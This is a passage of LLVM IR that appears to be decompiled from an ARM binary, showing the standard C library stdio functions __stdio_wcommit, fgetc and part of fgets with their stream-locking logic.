  uselistorder i32 %v4_15f8c, { 2, 1, 0 }
  uselistorder i32 %v4_15f5c, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 6, 5, 1, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_16068, { 1, 0 }
  uselistorder label %dec_label_pc_16054, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15fec, { 1, 0 }
  uselistorder label %dec_label_pc_15fc8, { 1, 0 }
  uselistorder label %dec_label_pc_15fa8, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16098 = load i32, i32* @r4, align 4
  store i32 %v3_16098, i32* %stack_var_-8, align 4
  %v1_1609c = add i32 %arg1, 8
  %v2_1609c = inttoptr i32 %v1_1609c to i32*
  %v3_1609c = load i32, i32* %v2_1609c, align 4
  store i32 %v3_1609c, i32* @r1, align 4
  %v1_160a0 = add i32 %arg1, 16
  %v2_160a0 = inttoptr i32 %v1_160a0 to i32*
  %v3_160a0 = load i32, i32* %v2_160a0, align 4
  %v9_160a4 = icmp eq i32 %v3_160a0, %v3_1609c
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_160a4, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_1609c, i32* %v2_160a0, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_160b0 = xor i1 %v9_160a4, true
  call void @__pseudo_cond_branch(i1 %v1_160b0, i32 ptrtoint (i32* @global_var_17a88.633 to i32))
  %v0_160b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_160b4 = add i32 %v0_160b4, 8
  %v2_160b4 = inttoptr i32 %v1_160b4 to i32*
  %v3_160b4 = load i32, i32* %v2_160b4, align 4
  %v1_160b8 = add i32 %v0_160b4, 16
  %v2_160b8 = inttoptr i32 %v1_160b8 to i32*
  %v3_160b8 = load i32, i32* %v2_160b8, align 4
  %v2_160bc = sub i32 %v3_160b8, %v3_160b4
  %v2_160c0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_160c0, i32* @r4, align 4
  ret i32 %v2_160bc

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_160c8 = load i32, i32* @r4, align 4
  store i32 %v3_160c8, i32* %stack_var_-20, align 4
  %v6_160c8 = load i32, i32* @r5, align 4
  %v9_160c8 = load i32, i32* @r6, align 4
  %v12_160c8 = load i32, i32* @r7, align 4
  %v15_160c8 = load i32, i32* @lr, align 4
  %v1_160cc = add i32 %arg1, 52
  %v2_160cc = inttoptr i32 %v1_160cc to i32*
  %v3_160cc = load i32, i32* %v2_160cc, align 4
  store i32 %v3_160cc, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_160d0 = icmp eq i32 %v3_160cc, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_160d0, label %dec_label_pc_16104, label %dec_label_pc_160e0

dec_label_pc_160e0:                               ; preds = %entry
  %v1_160e0 = add i32 %arg1, 16
  %v2_160e0 = inttoptr i32 %v1_160e0 to i32*
  %v3_160e0 = load i32, i32* %v2_160e0, align 4
  store i32 %v3_160e0, i32* %r2.global-to-local, align 4
  %v1_160e4 = add i32 %arg1, 24
  %v2_160e4 = inttoptr i32 %v1_160e4 to i32*
  %v3_160e4 = load i32, i32* %v2_160e4, align 4
  store i32 %v3_160e4, i32* %r3.global-to-local, align 4
  %v3_160e8 = icmp uge i32 %v3_160e0, %v3_160e4
  store i1 %v3_160e8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_160e8, label %dec_label_pc_160f8, label %.thread

.thread:                                          ; preds = %dec_label_pc_160e0
  %v2_160ec = inttoptr i32 %v3_160e0 to i8*
  %v3_160ec = load i8, i8* %v2_160ec, align 1
  %v4_160ec = zext i8 %v3_160ec to i32
  store i32 %v4_160ec, i32* %r5.global-to-local, align 4
  %v6_160ec = add i32 %v3_160e0, 1
  store i32 %v6_160ec, i32* %r2.global-to-local, align 4
  store i32 %v6_160ec, i32* %v2_160e0, align 4
  br label %dec_label_pc_161fc

dec_label_pc_160f8:                               ; preds = %dec_label_pc_160e0
  %v1_160f8 = inttoptr i32 %arg1 to i16*
  %v2_160f8 = call i32 @getc_unlocked(i16* %v1_160f8)
  store i32 %v2_160f8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_161fc

dec_label_pc_16104:                               ; preds = %entry
  %v0_16104 = call i32 @__aeabi_read_tp()
  %v0_16108 = load i32, i32* @r7, align 4
  %v1_16108 = add i32 %v0_16108, 64
  %v2_16108 = inttoptr i32 %v1_16108 to i32*
  %v3_16108 = load i32, i32* %v2_16108, align 4
  store i32 %v3_16108, i32* %r3.global-to-local, align 4
  %v1_1610c = add i32 %v0_16104, -1168
  store i32 %v1_1610c, i32* @r6, align 4
  %v3_16110 = icmp uge i32 %v3_16108, %v1_1610c
  store i1 %v3_16110, i1* %cpsr_c.global-to-local, align 1
  %v9_16110 = icmp eq i32 %v3_16108, %v1_1610c
  br i1 %v9_16110, label %dec_label_pc_16158, label %dec_label_pc_16118

dec_label_pc_16118:                               ; preds = %dec_label_pc_16104
  %v1_16118 = add i32 %v0_16108, 56
  store i32 %v1_16118, i32* @r5, align 4
  store i32 %v1_16118, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16124

dec_label_pc_16124:                               ; preds = %dec_label_pc_16130.dec_label_pc_16124_crit_edge, %dec_label_pc_16118
  %v0_16124 = phi i32 [ %v0_16124.pre, %dec_label_pc_16130.dec_label_pc_16124_crit_edge ], [ %v1_16118, %dec_label_pc_16118 ]
  %v1_16124 = inttoptr i32 %v0_16124 to i32*
  %v2_16124 = load i32, i32* %v1_16124, align 4
  store i32 %v2_16124, i32* %r3.global-to-local, align 4
  %v1_16128 = load i32, i32* @r4, align 4
  %v3_16128 = icmp uge i32 %v2_16124, %v1_16128
  store i1 %v3_16128, i1* %cpsr_c.global-to-local, align 1
  %v9_16128 = icmp eq i32 %v2_16124, %v1_16128
  br i1 %v9_16128, label %dec_label_pc_16130, label %dec_label_pc_16148

dec_label_pc_16130:                               ; preds = %dec_label_pc_16124
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16140 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16140, label %dec_label_pc_16144, label %dec_label_pc_16130.dec_label_pc_16124_crit_edge

dec_label_pc_16130.dec_label_pc_16124_crit_edge:  ; preds = %dec_label_pc_16130
  %v0_16124.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16124

dec_label_pc_16144:                               ; preds = %dec_label_pc_16130
  %v0_16144 = load i32, i32* @r4, align 4
  store i32 %v0_16144, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16148

dec_label_pc_16148:                               ; preds = %dec_label_pc_16124, %dec_label_pc_16144
  %v0_16148 = phi i32 [ %v0_16144, %dec_label_pc_16144 ], [ %v2_16124, %dec_label_pc_16124 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16148 = icmp eq i32 %v0_16148, 0
  br i1 %v2_16148, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_16148
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_16148, %bb
  store i32 90452, i32* @lr, align 4
  %v1_16150 = xor i1 %v2_16148, true
  call void @__pseudo_cond_branch(i1 %v1_16150, i32 ptrtoint (i32* @global_var_13f34.514 to i32))
  %v0_16154 = load i32, i32* @r6, align 4
  %v1_16154 = load i32, i32* @r7, align 4
  %v2_16154 = add i32 %v1_16154, 64
  %v3_16154 = inttoptr i32 %v2_16154 to i32*
  store i32 %v0_16154, i32* %v3_16154, align 4
  %v0_16158.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16158

dec_label_pc_16158:                               ; preds = %dec_label_pc_16104, %bb18
  %v1_16168 = phi i32 [ %v0_16108, %dec_label_pc_16104 ], [ %v0_16158.pre, %bb18 ]
  %v1_16158 = add i32 %v1_16168, 60
  %v2_16158 = inttoptr i32 %v1_16158 to i32*
  %v3_16158 = load i32, i32* %v2_16158, align 4
  store i32 %v3_16158, i32* %r2.global-to-local, align 4
  %v1_1615c = add i32 %v1_16168, 16
  %v2_1615c = inttoptr i32 %v1_1615c to i32*
  %v3_1615c = load i32, i32* %v2_1615c, align 4
  store i32 %v3_1615c, i32* @r1, align 4
  %v1_16160 = add i32 %v1_16168, 24
  %v2_16160 = inttoptr i32 %v1_16160 to i32*
  %v3_16160 = load i32, i32* %v2_16160, align 4
  store i32 %v3_16160, i32* %r3.global-to-local, align 4
  %v1_16164 = add i32 %v3_16158, 1
  store i32 %v1_16164, i32* %r2.global-to-local, align 4
  store i32 %v1_16164, i32* %v2_16158, align 4
  %v0_1616c = load i32, i32* @r1, align 4
  %v1_1616c = load i32, i32* %r3.global-to-local, align 4
  %v3_1616c = icmp uge i32 %v0_1616c, %v1_1616c
  store i1 %v3_1616c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_1616c, label %dec_label_pc_1617c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16158
  %v2_16170 = inttoptr i32 %v0_1616c to i8*
  %v3_16170 = load i8, i8* %v2_16170, align 1
  %v4_16170 = zext i8 %v3_16170 to i32
  store i32 %v4_16170, i32* %r5.global-to-local, align 4
  %v6_16170 = add i32 %v0_1616c, 1
  store i32 %v6_16170, i32* @r1, align 4
  %v2_16174 = load i32, i32* @r7, align 4
  %v3_16174 = add i32 %v2_16174, 16
  %v4_16174 = inttoptr i32 %v3_16174 to i32*
  store i32 %v6_16170, i32* %v4_16174, align 4
  br label %dec_label_pc_16188

dec_label_pc_1617c:                               ; preds = %dec_label_pc_16158
  %v0_1617c = load i32, i32* @r7, align 4
  %v1_16180 = inttoptr i32 %v0_1617c to i16*
  %v2_16180 = call i32 @getc_unlocked(i16* %v1_16180)
  store i32 %v2_16180, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16188

dec_label_pc_16188:                               ; preds = %.thread2, %dec_label_pc_1617c
  %v0_16188 = load i32, i32* @r7, align 4
  %v1_16188 = add i32 %v0_16188, 60
  %v2_16188 = inttoptr i32 %v1_16188 to i32*
  %v3_16188 = load i32, i32* %v2_16188, align 4
  %v1_1618c = add i32 %v3_16188, -1
  store i32 %v1_1618c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16190 = icmp eq i32 %v1_1618c, 0
  store i32 %v1_1618c, i32* %v2_16188, align 4
  br i1 %v2_16190, label %dec_label_pc_1619c, label %dec_label_pc_161fc

dec_label_pc_1619c:                               ; preds = %dec_label_pc_16188
  %v0_1619c = load i32, i32* %r3.global-to-local, align 4
  %v1_1619c = load i32, i32* @r7, align 4
  %v2_1619c = add i32 %v1_1619c, 64
  %v3_1619c = inttoptr i32 %v2_1619c to i32*
  store i32 %v0_1619c, i32* %v3_1619c, align 4
  %v0_161a0 = load i32, i32* @r7, align 4
  %v1_161a0 = add i32 %v0_161a0, 56
  store i32 %v1_161a0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_161a4

dec_label_pc_161a4:                               ; preds = %dec_label_pc_161d4.dec_label_pc_161a4_crit_edge, %dec_label_pc_1619c
  %v0_161ac = phi i32 [ %v0_161ac.pre, %dec_label_pc_161d4.dec_label_pc_161a4_crit_edge ], [ %v1_161a0, %dec_label_pc_1619c ]
  %v0_161a4 = phi i32 [ %v0_161a4.pre, %dec_label_pc_161d4.dec_label_pc_161a4_crit_edge ], [ %v0_161a0, %dec_label_pc_1619c ]
  %v1_161a4 = add i32 %v0_161a4, 56
  %v2_161a4 = inttoptr i32 %v1_161a4 to i32*
  %v3_161a4 = load i32, i32* %v2_161a4, align 4
  store i32 %v3_161a4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_161ac, i32* %r2.global-to-local, align 4
  %v1_161b022 = inttoptr i32 %v0_161ac to i32*
  %v2_161b023 = load i32, i32* %v1_161b022, align 4
  store i32 %v2_161b023, i32* %r3.global-to-local, align 4
  %v3_161b425 = icmp uge i32 %v2_161b023, %v3_161a4
  store i1 %v3_161b425, i1* %cpsr_c.global-to-local, align 1
  %v9_161b431 = icmp eq i32 %v2_161b023, %v3_161a4
  br i1 %v9_161b431, label %dec_label_pc_161bc, label %dec_label_pc_161d4

dec_label_pc_161bc:                               ; preds = %dec_label_pc_161a4, %dec_label_pc_161bc.dec_label_pc_161b0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_161cc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_161cc, label %dec_label_pc_161d0, label %dec_label_pc_161bc.dec_label_pc_161b0_crit_edge

dec_label_pc_161bc.dec_label_pc_161b0_crit_edge:  ; preds = %dec_label_pc_161bc
  %v0_161b0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_161b4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_161b0 = inttoptr i32 %v0_161b0.pre to i32*
  %v2_161b0 = load i32, i32* %v1_161b0, align 4
  store i32 %v2_161b0, i32* %r3.global-to-local, align 4
  %v3_161b4 = icmp uge i32 %v2_161b0, %v1_161b4.pre
  store i1 %v3_161b4, i1* %cpsr_c.global-to-local, align 1
  %v9_161b4 = icmp eq i32 %v2_161b0, %v1_161b4.pre
  br i1 %v9_161b4, label %dec_label_pc_161bc, label %dec_label_pc_161d4

dec_label_pc_161d0:                               ; preds = %dec_label_pc_161bc
  %v0_161d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_161d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_161d4

dec_label_pc_161d4:                               ; preds = %dec_label_pc_161a4, %dec_label_pc_161bc.dec_label_pc_161b0_crit_edge, %dec_label_pc_161d0
  %v0_161dc = phi i32 [ %v0_161d0, %dec_label_pc_161d0 ], [ %v2_161b023, %dec_label_pc_161a4 ], [ %v2_161b0, %dec_label_pc_161bc.dec_label_pc_161b0_crit_edge ]
  %v1_161d4 = phi i32 [ %v0_161d0, %dec_label_pc_161d0 ], [ %v3_161a4, %dec_label_pc_161a4 ], [ %v1_161b4.pre, %dec_label_pc_161bc.dec_label_pc_161b0_crit_edge ]
  %v3_161d4 = icmp uge i32 %v0_161dc, %v1_161d4
  store i1 %v3_161d4, i1* %cpsr_c.global-to-local, align 1
  %v9_161d4 = icmp eq i32 %v0_161dc, %v1_161d4
  br i1 %v9_161d4, label %dec_label_pc_161dc, label %dec_label_pc_161d4.dec_label_pc_161a4_crit_edge

dec_label_pc_161d4.dec_label_pc_161a4_crit_edge:  ; preds = %dec_label_pc_161d4
  %v0_161a4.pre = load i32, i32* @r7, align 4
  %v0_161ac.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_161a4

dec_label_pc_161dc:                               ; preds = %dec_label_pc_161d4
  %v2_161dc = icmp ne i32 %v1_161d4, 0
  store i1 %v2_161dc, i1* %cpsr_c.global-to-local, align 1
  %v7_161e0 = icmp slt i32 %v1_161d4, 2
  br i1 %v7_161e0, label %dec_label_pc_161fc, label %dec_label_pc_161e4

dec_label_pc_161e4:                               ; preds = %dec_label_pc_161dc
  %v0_161e8 = load i32, i32* @r1, align 4
  %v1_161e8 = add i32 %v0_161e8, 129
  store i32 %v1_161e8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_161fc

dec_label_pc_161fc:                               ; preds = %.thread, %dec_label_pc_16188, %dec_label_pc_161e4, %dec_label_pc_161dc, %dec_label_pc_160f8
  %v0_161fc = load i32, i32* %r5.global-to-local, align 4
  %v2_16204 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16204, i32* @r4, align 4
  store i32 %v6_160c8, i32* @r5, align 4
  store i32 %v9_160c8, i32* @r6, align 4
  store i32 %v12_160c8, i32* @r7, align 4
  store i32 %v15_160c8, i32* @lr, align 4
  ret i32 %v0_161fc

; uselistorder directives
  uselistorder i32 %v0_161d0, { 1, 0, 2 }
  uselistorder i32 %v1_161b4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1616c, { 1, 0, 2 }
  uselistorder i32 %v1_16168, { 0, 2, 1 }
  uselistorder i32 %v1_16128, { 1, 0 }
  uselistorder i32 %v3_160e0, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg1, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_161fc, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_161d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_161bc, { 1, 0 }
  uselistorder label %dec_label_pc_16188, { 1, 0 }
  uselistorder label %dec_label_pc_16158, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_16148, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1620c = load i32, i32* @r4, align 4
  store i32 %v3_1620c, i32* %stack_var_-32, align 4
  %v6_1620c = load i32, i32* @r5, align 4
  %v9_1620c = load i32, i32* @r6, align 4
  %v12_1620c = load i32, i32* @r7, align 4
  %v15_1620c = load i32, i32* @r8, align 4
  %v24_1620c = load i32, i32* @lr, align 4
  %v1_16210 = add i32 %arg3, 52
  %v2_16210 = inttoptr i32 %v1_16210 to i32*
  %v3_16210 = load i32, i32* %v2_16210, align 4
  store i32 %v3_16210, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16214 = icmp eq i32 %v3_16210, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_16214, label %dec_label_pc_16228, label %dec_label_pc_1628c

dec_label_pc_16228:                               ; preds = %entry
  %v0_16228 = call i32 @__aeabi_read_tp()
  %v1_1622c = add i32 %arg3, 64
  %v2_1622c = inttoptr i32 %v1_1622c to i32*
  %v3_1622c = load i32, i32* %v2_1622c, align 4
  store i32 %v3_1622c, i32* %r3.global-to-local, align 4
  %v1_16230 = add i32 %v0_16228, -1168
  store i32 %v1_16230, i32* @r8, align 4
  %v3_16234 = icmp uge i32 %v3_1622c, %v1_16230
  store i1 %v3_16234, i1* %cpsr_c.global-to-local, align 1
  %v9_16234 = icmp eq i32 %v3_1622c, %v1_16230
  br i1 %v9_16234, label %dec_label_pc_16280, label %dec_label_pc_1623c

dec_label_pc_1623c:                               ; preds = %dec_label_pc_16228
  %v1_1623c = add i32 %arg3, 56
  store i32 %v1_1623c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_1623c, i32* %r2.global-to-local, align 4
  %v0_16248 = load i32, i32* @r6, align 4
  store i32 %v0_16248, i32* @r4, align 4
  %v1_1624c36 = inttoptr i32 %v1_1623c to i32*
  %v2_1624c37 = load i32, i32* %v1_1624c36, align 4
  store i32 %v2_1624c37, i32* %r3.global-to-local, align 4
  %v3_1625039 = icmp uge i32 %v2_1624c37, %v0_16248
  store i1 %v3_1625039, i1* %cpsr_c.global-to-local, align 1
  %v9_1625045 = icmp eq i32 %v2_1624c37, %v0_16248
  br i1 %v9_1625045, label %dec_label_pc_16258, label %dec_label_pc_16270

dec_label_pc_16258:                               ; preds = %dec_label_pc_1623c, %dec_label_pc_16258.dec_label_pc_1624c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16268 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16268, label %dec_label_pc_1626c, label %dec_label_pc_16258.dec_label_pc_1624c_crit_edge

dec_label_pc_16258.dec_label_pc_1624c_crit_edge:  ; preds = %dec_label_pc_16258
  %v0_1624c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16250.pre = load i32, i32* @r4, align 4
  %v1_1624c = inttoptr i32 %v0_1624c.pre to i32*
  %v2_1624c = load i32, i32* %v1_1624c, align 4
  store i32 %v2_1624c, i32* %r3.global-to-local, align 4
  %v3_16250 = icmp uge i32 %v2_1624c, %v1_16250.pre
  store i1 %v3_16250, i1* %cpsr_c.global-to-local, align 1
  %v9_16250 = icmp eq i32 %v2_1624c, %v1_16250.pre
  br i1 %v9_16250, label %dec_label_pc_16258, label %dec_label_pc_16270

dec_label_pc_1626c:                               ; preds = %dec_label_pc_16258
  %v0_1626c = load i32, i32* @r4, align 4
  store i32 %v0_1626c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16270

dec_label_pc_16270:                               ; preds = %dec_label_pc_1623c, %dec_label_pc_16258.dec_label_pc_1624c_crit_edge, %dec_label_pc_1626c
  %v0_16270 = phi i32 [ %v0_1626c, %dec_label_pc_1626c ], [ %v2_1624c37, %dec_label_pc_1623c ], [ %v2_1624c, %dec_label_pc_16258.dec_label_pc_1624c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16270 = icmp eq i32 %v0_16270, 0
  br i1 %v2_16270, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_16270
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_16270, %bb
  store i32 90748, i32* @lr, align 4
  %v1_16278 = xor i1 %v2_16270, true
  call void @__pseudo_cond_branch(i1 %v1_16278, i32 ptrtoint (i32* @global_var_13f34.514 to i32))
  %v0_1627c = load i32, i32* @r8, align 4
  %v1_1627c = load i32, i32* @r7, align 4
  %v2_1627c = add i32 %v1_1627c, 64
  %v3_1627c = inttoptr i32 %v2_1627c to i32*
  store i32 %v0_1627c, i32* %v3_1627c, align 4
  br label %dec_label_pc_16280

dec_label_pc_16280:                               ; preds = %dec_label_pc_16228, %bb20
  %v0_16280 = load i32, i32* @r7, align 4
  %v1_16280 = add i32 %v0_16280, 60
  %v2_16280 = inttoptr i32 %v1_16280 to i32*
  %v3_16280 = load i32, i32* %v2_16280, align 4
  %v1_16284 = add i32 %v3_16280, 1
  store i32 %v1_16284, i32* %r3.global-to-local, align 4
  store i32 %v1_16284, i32* %v2_16280, align 4
  %v0_1628c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_16290.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_16294.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1628c

dec_label_pc_1628c:                               ; preds = %entry, %dec_label_pc_16280
  %v0_16294 = phi i32 [ %arg3, %entry ], [ %v0_16294.pre, %dec_label_pc_16280 ]
  %v0_16290 = phi i32 [ %arg2, %entry ], [ %v0_16290.pre, %dec_label_pc_16280 ]
  %v0_1628c = phi i32 [ %arg1, %entry ], [ %v0_1628c.pre, %dec_label_pc_16280 ]
  store i32 %v0_16290, i32* %r1.global-to-local, align 4
  store i32 %v0_16294, i32* %r2.global-to-local, align 4
  %v3_16298 = inttoptr i32 %v0_1628c to i8*
  %v4_16298 = call i32 @__GI_fgets_unlocked(i8* %v3_16298, i32 %v0_16290, i32 %v0_16294)
  %v0_1629c = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1629c = icmp eq i32 %v0_1629c, 0
  store i32 %v4_16298, i32* %r8.global-to-local, align 4
  br i1 %v2_1629c, label %dec_label_pc_162a8, label %dec_label_pc_1631c

dec_label_pc_162a8:                               ; preds = %dec_label_pc_1628c
  %v0_162a8 = load i32, i32* @r7, align 4
  %v1_162a8 = add i32 %v0_162a8, 60
  %v2_162a8 = inttoptr i32 %v1_162a8 to i32*
  %v3_162a8 = load i32, i32* %v2_162a8, align 4
  %v1_162ac = add i32 %v3_162a8, -1
  store i32 %v1_162ac, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_162b0 = icmp eq i32 %v1_162ac, 0
  store i32 %v1_162ac, i32* %v2_162a8, align 4
  br i1 %v2_162b0, label %dec_label_pc_162bc, label %dec_label_pc_1631c

dec_label_pc_162bc:                               ; preds = %dec_label_pc_162a8
  %v0_162bc = load i32, i32* %r3.global-to-local, align 4
  %v1_162bc = load i32, i32* @r7, align 4
  %v2_162bc = add i32 %v1_162bc, 64
  %v3_162bc = inttoptr i32 %v2_162bc to i32*
  store i32 %v0_162bc, i32* %v3_162bc, align 4
  %v0_162c0 = load i32, i32* @r7, align 4
  %v1_162c0 = add i32 %v0_162c0, 56
  store i32 %v1_162c0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_162c4

dec_label_pc_162c4:                               ; preds = %dec_label_pc_162f4.dec_label_pc_162c4_crit_edge, %dec_label_pc_162bc
  %v0_162cc = phi i32 [ %v0_162cc.pre, %dec_label_pc_162f4.dec_label_pc_162c4_crit_edge ], [ %v1_162c0, %dec_label_pc_162bc ]
  %v0_162c4 = phi i32 [ %v0_162c4.pre, %dec_label_pc_162f4.dec_label_pc_162c4_crit_edge ], [ %v0_162c0, %dec_label_pc_162bc ]
  %v1_162c4 = add i32 %v0_162c4, 56
  %v2_162c4 = inttoptr i32 %v1_162c4 to i32*
  %v3_162c4 = load i32, i32* %v2_162c4, align 4
  store i32 %v3_162c4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_162cc, i32* %r2.global-to-local, align 4
  %v1_162d024 = inttoptr i32 %v0_162cc to i32*
  %v2_162d025 = load i32, i32* %v1_162d024, align 4
  store i32 %v2_162d025, i32* %r3.global-to-local, align 4
  %v3_162d427 = icmp uge i32 %v2_162d025, %v3_162c4
  store i1 %v3_162d427, i1* %cpsr_c.global-to-local, align 1
  %v9_162d433 = icmp eq i32 %v2_162d025, %v3_162c4
  br i1 %v9_162d433, label %dec_label_pc_162dc, label %dec_label_pc_162f4

dec_label_pc_162dc:                               ; preds = %dec_label_pc_162c4, %dec_label_pc_162dc.dec_label_pc_162d0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_162ec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_162ec, label %dec_label_pc_162f0, label %dec_label_pc_162dc.dec_label_pc_162d0_crit_edge

dec_label_pc_162dc.dec_label_pc_162d0_crit_edge:  ; preds = %dec_label_pc_162dc
  %v0_162d0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_162d4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_162d0 = inttoptr i32 %v0_162d0.pre to i32*
  %v2_162d0 = load i32, i32* %v1_162d0, align 4
  store i32 %v2_162d0, i32* %r3.global-to-local, align 4
  %v3_162d4 = icmp uge i32 %v2_162d0, %v1_162d4.pre
  store i1 %v3_162d4, i1* %cpsr_c.global-to-local, align 1
  %v9_162d4 = icmp eq i32 %v2_162d0, %v1_162d4.pre
  br i1 %v9_162d4, label %dec_label_pc_162dc, label %dec_label_pc_162f4

dec_label_pc_162f0:                               ; preds = %dec_label_pc_162dc
  %v0_162f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_162f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_162f4

dec_label_pc_162f4:                               ; preds = %dec_label_pc_162c4, %dec_label_pc_162dc.dec_label_pc_162d0_crit_edge, %dec_label_pc_162f0
  %v0_162fc = phi i32 [ %v0_162f0, %dec_label_pc_162f0 ], [ %v2_162d025, %dec_label_pc_162c4 ], [ %v2_162d0, %dec_label_pc_162dc.dec_label_pc_162d0_crit_edge ]
  %v1_162f4 = phi i32 [ %v0_162f0, %dec_label_pc_162f0 ], [ %v3_162c4, %dec_label_pc_162c4 ], [ %v1_162d4.pre, %dec_label_pc_162dc.dec_label_pc_162d0_crit_edge ]
  %v3_162f4 = icmp uge i32 %v0_162fc, %v1_162f4
  store i1 %v3_162f4, i1* %cpsr_c.global-to-local, align 1
